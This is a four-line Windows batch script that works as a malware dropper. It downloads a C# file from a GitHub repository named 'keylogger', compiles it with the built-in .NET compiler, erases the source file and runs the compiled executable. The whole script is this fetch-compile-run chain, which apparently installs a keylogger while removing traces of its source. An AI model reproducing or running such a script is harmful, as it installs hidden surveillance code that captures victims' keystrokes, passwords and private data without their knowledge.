@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/exploitrealtime.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe exploitrealtime.cs
erase exploitrealtime.cs & exploitrealtime.exe
